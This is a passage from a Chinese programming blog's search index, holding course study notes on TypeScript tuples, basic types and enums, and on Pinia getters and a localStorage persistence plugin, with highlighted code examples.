(&#123;</span><br><span class="line">    <span class="attr">user</span>: &lt;<span class="title class_">User</span>&gt;&#123;&#125;,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;yajue&quot;</span></span><br><span class="line">  &#125;),</span><br><span class="line"></span><br><span class="line">  <span class="attr">getters</span>: &#123;</span><br><span class="line">    <span class="title function_">newName</span>():<span class="built_in">string</span> &#123;</span><br><span class="line">      <span class="comment">// getters中的方法可以相互调用</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">`***<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> - <span class="subst">$&#123;<span class="variable language_">this</span>.getUserAge&#125;</span>***`</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">getUserAge</span>(): <span class="built_in">number</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">user</span>.<span class="property">age</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    getters: &#123;&#123; Test.newName &#125;&#125;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;button @click=&quot;change&quot;&gt;change&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123; useTestStore &#125; from &quot;./store&quot;</span><br><span class="line"></span><br><span class="line">const Test = useTestStore()</span><br><span class="line"></span><br><span class="line">const change = ()=&gt; &#123;</span><br><span class="line">  Test.setUser()</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>元组类型</title>
    <url>/web/study/TypeScript/10.%E5%85%83%E7%BB%84%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h1><p>元组(Tuple)是固定数量的不同类型的元素的组合，是数组的变种</p>
<p>元组与集合的不同之处：元组中的元素类型可以是不同的，而且数量固定</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 元组</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr</span>:[<span class="attr">a</span>:<span class="built_in">number</span>,<span class="attr">b</span>:<span class="built_in">boolean</span>] = [<span class="number">114</span>,<span class="literal">false</span>]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">514</span>      <span class="comment">// OK</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="literal">true</span>     <span class="comment">// OK</span></span><br><span class="line"><span class="comment">// arr[1] = &quot;yajue&quot;  // 不OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 元组可以越界，越界元素会被限制为联合类型，比如这里arr[2]的类型是number|boolean</span></span><br><span class="line">arr.<span class="title function_">push</span>(<span class="number">1919</span>)    <span class="comment">// OK</span></span><br><span class="line"><span class="comment">// arr.push(&quot;yajue&quot;) // 不OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能直接给越界元素赋值</span></span><br><span class="line"><span class="comment">// arr[2] = 1919     // 不OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读元组，完全不能越界</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr2</span>:<span class="keyword">readonly</span>[<span class="attr">a</span>:<span class="built_in">number</span>,<span class="attr">b</span>:<span class="built_in">boolean</span>] = [<span class="number">114</span>,<span class="literal">false</span>]</span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">519</span>	<span class="comment">// OK</span></span><br><span class="line"><span class="comment">// arr2.push(1919)    // 不OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 元组内元素可选</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr3</span>:[<span class="attr">a</span>:<span class="built_in">number</span>,b?:<span class="built_in">boolean</span>] = [<span class="number">114</span>]    <span class="comment">// OK</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 取得元组元素的类型</span></span><br><span class="line"><span class="keyword">type</span> first = <span class="keyword">typeof</span> arr[<span class="number">0</span>]</span><br><span class="line"><span class="comment">// 取得元组的长度</span></span><br><span class="line"><span class="keyword">type</span> len = <span class="keyword">typeof</span> arr[<span class="string">&quot;length&quot;</span>]</span><br></pre></td></tr></table></figure>

<h1 id="元组的应用"><a href="#元组的应用" class="headerlink" title="元组的应用"></a>元组的应用</h1><p>元组可以把多个元素作为一个单元传递，能描述表格每行的内容，例如excel返回的数据：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">excel</span>: [<span class="built_in">string</span>, <span class="built_in">string</span>, <span class="built_in">number</span>, <span class="built_in">string</span>][] = [</span><br><span class="line">    [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="number">1</span>, <span class="string">&#x27;123&#x27;</span>],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Pinia插件</title>
    <url>/web/study/Pinia/7.Pinia%E6%8F%92%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>Pinia和VueX一样存在页面刷新状态丢失的问题。</p>
<p>为了防止数据丢失，可以写一个Pinia插件缓存值。</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>前端可以使用LocalStorage、SessionStorage或Cookie持久化数据。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; toRaw &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">PiniaPluginContext</span> &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Options</span> = &#123;</span><br><span class="line">  key?: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> __piniaKey__ = <span class="string">&quot;yajue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">setStorage</span> = (<span class="params">key:<span class="built_in">string</span>, value:<span class="built_in">any</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(key,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(value))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getStorage</span> = (<span class="params">key:<span class="built_in">string</span></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(key)? <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(key) <span class="keyword">as</span> <span class="built_in">string</span>): &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Pinia内部会调用这个插件函数，并传一些参数</span></span><br><span class="line"><span class="comment">// 函数柯里化，同时接收用户配置和Pinia传递配置</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">piniaPlugin</span> = (<span class="params">options:Options</span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span>(<span class="function">(<span class="params">context: PiniaPluginContext</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; store &#125; = context</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取缓存值</span></span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">getStorage</span>(<span class="string">`<span class="subst">$&#123;options?.key ?? __piniaKey__&#125;</span>-<span class="subst">$&#123;store.$id&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 值改变时设置新值</span></span><br><span class="line">    store.$subscribe(<span class="function">()=&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 存的时候不要放代理对象，记得变成原始对象</span></span><br><span class="line">      <span class="title function_">setStorage</span>(<span class="string">`<span class="subst">$&#123;options?.key ?? __piniaKey__&#125;</span>-<span class="subst">$&#123;store.$id&#125;</span>`</span>,<span class="title function_">toRaw</span>(store.<span class="property">$state</span>))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回值会交给仓库的state</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      ...data</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>基础类型</title>
    <url>/web/study/TypeScript/1.%E5%9F%BA%E7%A1%80%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<h1 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h1><p>TS是如今很多公司前端开发必备的技术</p>
<p>TS是JS的超集，所以JS基础的类型都包含在内</p>
<p>JS是一门非常灵活的语言，而TS在JS的基础上加入了类型约束，限制太过灵活的JS</p>
<p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install typescript -g</span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tsc [文件名]</span><br></pre></td></tr></table></figure>

<p>基础类型：Boolean、Number、String、null、undefined以及ES6的Symbol和ES10的BigInt</p>
<h1 id="基础类型"><a href="#基础类型" class="headerlink" title="基础类型"></a>基础类型</h1><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>字符串使用string定义</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="built_in">string</span> = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">str</span>: <span class="built_in">string</span> = <span class="string">`dddd<span class="subst">$&#123;a&#125;</span>`</span></span><br></pre></td></tr></table></figure>

<h2 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h2><p>数字使用number定义</p>
<p>支持十六进制、十进制、八进制和二进制</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">notANumber</span>: <span class="built_in">number</span> = <span class="title class_">NaN</span><span class="comment">//NaN</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">num</span>: <span class="built_in">number</span> = <span class="number">114</span><span class="comment">//普通数字</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">float</span>: <span class="built_in">number</span> = <span class="number">5.14</span><span class="comment">//小数</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">infinityNumber</span>: <span class="built_in">number</span> = <span class="title class_">Infinity</span><span class="comment">//无穷大</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">decimal</span>: <span class="built_in">number</span> = <span class="number">6</span><span class="comment">//十进制</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">hex</span>: <span class="built_in">number</span> = <span class="number">0xf00d</span><span class="comment">//十六进制</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">binary</span>: <span class="built_in">number</span> = <span class="number">0b1010</span><span class="comment">//二进制</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">octal</span>: <span class="built_in">number</span> = <span class="number">0o744</span><span class="comment">//八进制s</span></span><br></pre></td></tr></table></figure>

<h2 id="布尔类型"><a href="#布尔类型" class="headerlink" title="布尔类型"></a>布尔类型</h2><p>布尔使用boolean定义</p>
<p>使用构造函数Boolean创建的对象是包装器对象，类型为Boolean而不是boolean</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">boolean</span>: <span class="built_in">boolean</span> = <span class="literal">true</span> <span class="comment">//直接使用布尔值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// let booleand2: boolean = Boolean(1) // 这样会报错</span></span><br><span class="line"><span class="keyword">let</span> booleand=<span class="number">2</span>: <span class="title class_">Boolean</span> = <span class="title class_">Boolean</span>(<span class="number">1</span>) <span class="comment">//构造函数返回布尔值</span></span><br></pre></td></tr></table></figure>

<h2 id="空值类型"><a href="#空值类型" class="headerlink" title="空值类型"></a>空值类型</h2><p>JavaScript没有空值(Void)的概念，在TypeScript中，可以用void表示没有任何返回值的函数</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">voidFn</span>(<span class="params"></span>): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;test void&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>void类型主要用在不希望调用者关心函数返回值的情况下，比如通常的异步回调函数</p>
<p>void也可以定义undefined和null类型</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">u</span>: <span class="built_in">void</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="built_in">void</span> = <span class="literal">null</span></span><br></pre></td></tr></table></figure>

<h2 id="null和undefined类型"><a href="#null和undefined类型" class="headerlink" title="null和undefined类型"></a>null和undefined类型</h2><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">u</span>: <span class="literal">undefined</span> = <span class="literal">undefined</span><span class="comment">//定义undefined</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">n</span>: <span class="literal">null</span> = <span class="literal">null</span><span class="comment">//定义null</span></span><br></pre></td></tr></table></figure>

<p>undefined和null是所有类型的子类型，所以undefined和null类型的变量，可以赋值给string类型的变量</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这样写会报错 void类型不可以分给其他类型</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">test</span>: <span class="built_in">void</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">num2</span>: <span class="built_in">string</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">num2 = test</span><br><span class="line"></span><br><span class="line"><span class="comment">//这样是没问题的</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">test</span>: <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">num2</span>: <span class="built_in">string</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">num2 = test</span><br><span class="line"></span><br><span class="line"><span class="comment">//或者这样的</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">test</span>: <span class="literal">undefined</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">num2</span>: <span class="built_in">string</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">num2 = test</span><br></pre></td></tr></table></figure>


<p>如果配置了tsconfig.json开启了严格模式</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;strict&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>那么null就不能赋给void类型</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>枚举类型</title>
    <url>/web/study/TypeScript/11.%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1wR4y1377K?vd_source=abff2190dd215e2033f2ec57123dd1d6">小满TypeScript基础教程全集（完结）</a></p>
<p>使用enum关键字可以定义枚举</p>
<h1 id="数字枚举"><a href="#数字枚举" class="headerlink" title="数字枚举"></a>数字枚举</h1><p>枚举默认从0开始，每个成员都表示一个数字</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  red,</span><br><span class="line">  green,</span><br><span class="line">  blue</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Color</span>.<span class="property">red</span>,<span class="title class_">Color</span>.<span class="property">green</span>,<span class="title class_">Color</span>.<span class="property">blue</span>) <span class="comment">// -&gt;0 1 2</span></span><br></pre></td></tr></table></figure>

<p>可以给成员赋值，没赋值的成员，默认值就是上一个成员的值+1</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  red = -<span class="number">1</span>,</span><br><span class="line">  green,</span><br><span class="line">  blue</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Color</span>.<span class="property">red</span>,<span class="title class_">Color</span>.<span class="property">green</span>,<span class="title class_">Color</span>.<span class="property">blue</span>) <span class="comment">// -&gt;-1 0 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color2</span> &#123;</span><br><span class="line">  red = <span class="number">2.3</span>,</span><br><span class="line">  green,</span><br><span class="line">  blue = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Color2</span>.<span class="property">red</span>,<span class="title class_">Color2</span>.<span class="property">green</span>,<span class="title class_">Color2</span>.<span class="property">blue</span>) <span class="comment">// -&gt;2.3 3.3 2</span></span><br></pre></td></tr></table></figure>

<h1 id="字符串枚举"><a href="#字符串枚举" class="headerlink" title="字符串枚举"></a>字符串枚举</h1><p>枚举中的每个成员都赋值为字符串时，就是字符串枚举</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">  red = <span class="string">&quot;red&quot;</span>,</span><br><span class="line">  green = <span class="string">&quot;green&quot;</span>,</span><br><span class="line">  <span class="comment">// 字符串枚举必须给每一项都赋值</span></span><br><span class="line">  <span class="comment">// blue = &quot;blue&quot;		// 不OK</span></span><br><span class="line">  blue = <span class="string">&quot;blue&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Color</span>.<span class="property">red</span>,<span class="title class_">Color</span>.<span class="property">green</span>,<span class="title class_">Color</span>.<span class="property">blue</span>) <span class="comment">// -&gt;-&quot;red&quot; &quot;green&quot; &quot;blue&quot;</span></span><br></pre></td></tr></table></figure>

<p>字符串枚举没有自增长的行为，所以字符串枚举可以很好的序列化，从语义上讲比数字枚举更有意义</p>
<h1 id="异构枚举"><a href="#异构枚举" class="headerlink" title="异构枚举"></a>异构枚举</h1><p>枚举时可以混合字符串和数字成员</p>
<p>赋值为字符串的成员，之后的成员必须赋值，因为字符串影响了默认值的递增</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Types</span>&#123;</span><br><span class="line">  aa,</span><br><span class="line">  bb = <span class="number">5</span>,</span><br><span class="line">  cc,</span><br><span class="line">  <span class="title class_">No</span> = <span class="string">&quot;No&quot;</span>,</span><br><span class="line">  <span class="comment">// 不能使用，因为dd前面有一个成员的值是字符串</span></span><br><span class="line">  <span class="comment">// dd,</span></span><br><span class="line">  <span class="title class_">Yes</span> = <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Types</span>.<span class="property">aa</span>,<span class="title class_">Types</span>.<span class="property">bb</span>,<span class="title class_">Types</span>.<span class="property">cc</span>,<span class="title class_">Types</span>.<span class="property">No</span>,<span class="title class_">Types</span>.<span class="property">Yes</span>) <span class="comment">// -&gt; 0 5 6 &quot;No&quot; 1</span></span><br></pre></td></tr></table></figure>

<h1 id="接口枚举"><a href="#接口枚举" class="headerlink" title="接口枚举"></a>接口枚举</h1><p>接口和枚举可以复合使用</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Types</span>&#123;</span><br><span class="line">  <span class="title class_">No</span> = <span class="string">&quot;No&quot;</span>,</span><br><span class="line">  <span class="title class_">Yes</span> = <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> A &#123;</span><br><span class="line">  <span class="attr">red</span>: <span class="title class_">Types</span>.<span class="property">Yes</span></span><br><span class="line">  <span class="attr">green</span>: <span class="title class_">Types</span>.<span class="property">No</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">obj</span>:A = &#123;</span><br><span class="line">  <span class="comment">// red: &quot;aaa&quot;,  // 不OK</span></span><br><span class="line">  <span class="attr">red</span>: <span class="number">1</span>,  <span class="comment">// OK</span></span><br><span class="line">  <span class="attr">green</span>: <span class="title class_">Types</span>.<span class="property">No</span>  <span class="comment">// OK</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="const枚举"><a href="#const枚举" class="headerlink" title="const枚举"></a>const枚举</h1><p>const枚举在编译后会直接变成常量</p>
<p>编译前：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> <span class="title class_">Types</span>&#123;</span><br><span class="line">  success,</span><br><span class="line">  fail</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(code === <span class="title class_">Types</span>.<span class="property">success</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>编译后：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 直接把Types.success编译成0（具体的值）了</span></span><br><span class="line"><span class="keyword">if</span> (code === <span class="number">0</span> <span class="comment">/* Types.success */</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>如果不加const关键字，枚举会被编译成：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Types</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Types</span>) &#123;</span><br><span class="line">    <span class="title class_">Types</span>[<span class="title class_">Types</span>[<span class="string">&quot;success&quot;</span>] = <span class="number">0</span>] = <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    <span class="title class_">Types</span>[<span class="title class_">Types</span>[<span class="string">&quot;fail&quot;</span>] = <span class="number">1</span>] = <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Types</span> || (<span class="title class_">Types</span> = &#123;&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (code === <span class="title class_">Types</span>.<span class="property">success</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Types</span>)	<span class="comment">// -&gt;&#123; &#x27;0&#x27;: &#x27;success&#x27;, &#x27;1&#x27;: &#x27;fail&#x27;, success: 0, fail: 1 &#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="反向映射"><a href="#反向映射" class="headerlink" title="反向映射"></a>反向映射</h1><p>正向映射是key→value，那么反向映射就是value→key</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Types</span>&#123;</span><br><span class="line">  success = <span class="number">114</span>,</span><br><span class="line">  fail = <span class="string">&quot;fff&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不仅可以通过成员名读值（正向映射）</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">success</span>:<span class="built_in">number</span> = <span class="title class_">Types</span>.<span class="property">success</span></span><br><span class="line"><span class="comment">// 也可以通过值读成员名（反向映射）</span></span><br><span class="line"><span class="keyword">let</span> skey = <span class="title class_">Types</span>[success]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 但字符串枚举成员无法进行反向映射</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">fail</span>:<span class="built_in">string</span> = <span class="title class_">Types</span>.<span class="property">fail</span></span><br><span class="line"><span class="keyword">let</span> fkey = <span class="title class_">Types</span>[fail]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(success, skey, fail, fkey)  <span class="comment">// -&gt; 114 &quot;success&quot; &quot;fff&quot; undefined</span></span><br></pre></td></tr></table></figure>

<p>编译后：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Types</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Types</span>) &#123;</span><br><span class="line">    <span class="title class_">Types</span>[<span class="title class_">Types</span>[<span class="string">&quot;success&quot;</span>] = <span class="number">114</span>] = <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    <span class="comment">// 没有进行Types[fff]=&quot;fail&quot;的赋值</span></span><br><span class="line">    <span class="title class_">Types</span>[<span class="string">&quot;fail&quot;</span>] = <span class="string">&quot;fff&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Types</span> || (<span class="title class_">Types</span> = &#123;&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> success = <span class="title class_">Types</span>.<span class="property">success</span>;</span><br><span class="line"><span class="keyword">let</span> skey = <span class="title class_">Types</span>[success];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fail = <span class="title class_">Types</span>.<span class="property">fail</span>;</span><br><span class="line"><span class="keyword">let</span> fkey = <span class="title class_">Types</span>[fail];</span><br></pre></td></tr></table></figure>

<p>如果枚举中出现数字值重复，那么使用反向映射时可能会出问题：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Types</span>&#123;</span><br><span class="line">  success = <span class="number">114</span>,</span><br><span class="line">  fail = <span class="number">114</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">success</span>:<span class="built_in">number</span> = <span class="title class_">Types</span>.<span class="property">success</span></span><br><span class="line"><span class="keyword">let</span> skey = <span class="title class_">Types</span>[success]</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">fail</span>:<span class="built_in">number</span> = <span class="title class_">Types</span>.<span class="property">fail</span></span><br><span class="line"><span class="keyword">let</span> fkey = <span class="title class_">Types</span>[fail]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(success, skey, fail, fkey)  <span class="comment">// -&gt; 114 &quot;fail&quot; 114 &quot;fail&quot;</span></span><br></pre></td></tr></table></figure>

<p>因为编译后出现了对象键值的覆盖：</p>
